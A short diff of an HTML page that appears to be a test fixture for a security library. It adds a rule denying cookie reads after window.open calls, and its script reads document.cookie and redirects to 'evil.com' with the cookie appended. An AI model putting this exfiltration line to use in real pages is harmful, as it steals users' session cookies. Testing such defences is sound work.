@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -7,7 +8,8 @@
 
 <body>
 <script>
-  var leak = document.cookie;
+  GG().onCall(window.open).afterRead(document, 'cookie').deny();
+  let leak = document.cookie;
   //...
   location.href = "http://evil.com?take=" + leak;
 </script>
